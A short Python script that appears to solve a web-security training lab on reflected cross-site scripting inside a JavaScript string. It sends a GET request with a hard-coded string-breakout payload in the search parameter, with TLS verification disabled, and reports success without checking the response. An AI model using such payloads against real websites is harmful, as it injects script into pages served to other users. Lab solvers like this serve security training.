import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped"

def run(url, payload, proxies=None):
    path = "?search="
    payload = r"""\';alert(1);//"""
    try:
        r = requests.get(url.rstrip('/') + path + payload, verify=False, proxies=proxies)
        res = r.text
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False